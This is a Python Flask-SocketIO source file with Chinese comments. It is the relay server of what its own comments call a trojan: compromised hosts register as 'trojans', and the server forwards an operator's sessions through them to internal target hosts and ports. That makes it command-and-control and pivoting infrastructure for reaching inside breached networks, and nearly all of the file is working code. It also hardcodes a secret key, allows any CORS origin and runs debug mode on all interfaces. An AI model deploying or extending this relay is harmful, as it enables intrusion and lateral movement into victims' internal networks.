from flask import Flask, request
from flask_socketio import SocketIO, emit, join_room, leave_room
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

# 管理session_id到trojan连接的映射
session_to_trojan = {}
session_to_client_sid = {}  # session_id对应的客户端的Socket.IO的sid
session_target_info = {}    # 保存session_id对应的target信息

# 由于server需要同时接受client和trojan的连接，我们区分事件名称
# 假设client和trojan都连接到本server的同一个SocketIO地址
# 因此，需要区分来自哪个Namespace或者在消息中加标识
# 为简单，此处假设client和trojan都发来相同的事件，但通过特定字段区分角色。

@socketio.on('connect')
def handle_connect():
    print("A WebSocket client connected:", request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    print("A WebSocket client disconnected:", request.sid)
    # 清理session中映射的连接
    # 如果某个trojan或者client断连，需要清理session映射
    for s, tsid in list(session_to_trojan.items()):
        if tsid == request.sid:
            del session_to_trojan[s]
    for s, csid in list(session_to_client_sid.items()):
        if csid == request.sid:
            del session_to_client_sid[s]

@socketio.on('start_session')
def handle_start_session(data):
    # 由client发起，会话开始
    session_id = data.get('session_id')
    target_host = data.get('target_host')
    target_port = data.get('target_port')
    session_to_client_sid[session_id] = request.sid
    session_target_info[session_id] = (target_host, target_port)
    # 向trojan请求建立对应的内网连接
    # 这里假设只有一个trojan连接，如果有多个，需要根据target_host做路由判断。
    # 简单起见，我们找任意已知的trojan连接转发：
    trojan_sid = get_any_trojan_sid()
    if trojan_sid:
        session_to_trojan[session_id] = trojan_sid
        socketio.emit('establish_internal_conn', {
            'session_id': session_id,
            'target_host': target_host,
            'target_port': target_port
        }, to=trojan_sid)
    else:
        # 没有trojan可用
        emit('response_from_server', {
            'session_id': session_id,
            'payload': b'No trojan available'
        }, to=session_to_client_sid[session_id])

@socketio.on('data_from_client')
def handle_data_from_client(data):
    # client发来的数据，转发给trojan
    session_id = data.get('session_id')
    payload = data.get('payload', b'')
    trojan_sid = session_to_trojan.get(session_id)
    if trojan_sid:
        socketio.emit('data_from_server', {
            'session_id': session_id,
            'payload': payload
        }, to=trojan_sid)

@socketio.on('end_session')
def handle_end_session(data):
    session_id = data.get('session_id')
    # 通知trojan结束会话
    trojan_sid = session_to_trojan.get(session_id)
    if trojan_sid:
        socketio.emit('close_internal_conn', {
            'session_id': session_id
        }, to=trojan_sid)
    # 清理本地记录
    if session_id in session_to_client_sid:
        del session_to_client_sid[session_id]
    if session_id in session_to_trojan:
        del session_to_trojan[session_id]
    if session_id in session_target_info:
        del session_target_info[session_id]

# trojan端事件
@socketio.on('trojan_hello')
def handle_trojan_hello(data):
    # trojan向server注册自己
    # 可存储trojan_sid到trojan信息的映射
    print("Trojan connected:", request.sid)

@socketio.on('data_from_trojan')
def handle_data_from_trojan(data):
    # trojan发回的数据转发给client
    session_id = data.get('session_id')
    payload = data.get('payload', b'')
    client_sid = session_to_client_sid.get(session_id)
    if client_sid:
        socketio.emit('response_from_server', {
            'session_id': session_id,
            'payload': payload
        }, to=client_sid)

def get_any_trojan_sid():
    # 在真实环境中，需要更完善的负载均衡或匹配逻辑
    # 此处简单返回连接的第一个trojan
    # 我们可以在handle_trojan_hello中缓存trojan的sid
    # 暂时这里用一个全局保存trojan列表的变量
    global trojan_list
    if 'trojan_list' not in globals():
        trojan_list = []
    # 清理掉已经断开的trojan
    trojan_list = [t for t in trojan_list if t in socketio.server.manager.rooms['/']]
    if len(trojan_list) > 0:
        return trojan_list[0]
    return None

@socketio.on('trojan_register')
def handle_trojan_register(data):
    # 注册trojan
    global trojan_list
    if 'trojan_list' not in globals():
        trojan_list = []
    if request.sid not in trojan_list:
        trojan_list.append(request.sid)
    emit('trojan_registered', {'status': 'ok'})

if __name__ == '__main__':
    # 运行server
    # 在生产环境中建议使用 eventlet 或 gevent
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
